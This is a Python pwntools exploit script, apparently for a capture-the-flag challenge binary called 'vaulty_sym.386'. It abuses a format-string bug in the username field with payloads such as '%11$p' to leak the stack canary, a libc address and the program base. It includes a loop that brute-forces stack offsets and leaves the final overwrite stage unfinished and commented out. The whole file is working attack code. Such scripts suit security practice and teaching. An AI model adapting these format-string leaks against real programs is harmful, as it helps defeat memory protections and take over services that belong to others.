#!/usr/bin/env python3

from pwn import *

exe = ELF("vaulty_sym.386")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r

r = conn()

sa   = lambda a,b : r.sendafter(a,b)
sla  = lambda a,b : r.sendlineafter(a,b)
sd   = lambda a,b : r.send(a,b)
sl   = lambda a : r.sendline(a)
ru   = lambda a : r.recvuntil(a, drop=True)
rc   = lambda : r.recv(4096)
uu32 = lambda data : u32(data.ljust(4, b'\0'))
uu64 = lambda data : u64(data.ljust(8, b'\0'))

def alloc(username, password, url):
    sla(b"):\n", "1")
    sla(b":", username)
    sla(b":", password)
    sla(b":", url)

def print_thing(index):
    sla(b"):\n", "4")
    sla(b":", f"{index}")

def leak(index):
    print_thing(index)

def enum():
    global r
    r.close()
    for i in range(6,300):
        r = process("./vaulty_sym.386")
        alloc(f"AAAAAAAAAAAAA %{i}$p","1","1")
        leak(0)
        ru(b"AAAA ")
        lol = int(r.recvline().strip(), 16)
        log.info(f"{i}: {hex(lol)}")
        r.close()

def main():
    #enum()
    alloc("%11$p","1","1")
    leak(0)
    ru(b"Username:")
    canary = int(r.recvline().strip(), 16)
    log.info(f"canary: {hex(canary)}")
    alloc("%14$p","1","1")
    leak(1)
    ru(b"Username:")
    libc = int(r.recvline().strip(), 16)
    log.info(f"libc: {hex(libc)}")
    alloc("%13$p","1","1")
    leak(2)
    ru(b"Username:")
    base = int(r.recvline().strip(), 16) - 0x1984
    log.info(f"base: {hex(base)}")
    #alloc(f"{p64(base+)}%16$x","1","1")
    leak(2)
    ru(b"Username:")
    base = int(r.recvline().strip(), 16) - 0x1984
    log.info(f"base: {hex(base)}")
    gdb.attach(r)

    r.interactive()


if __name__ == "__main__":
    main()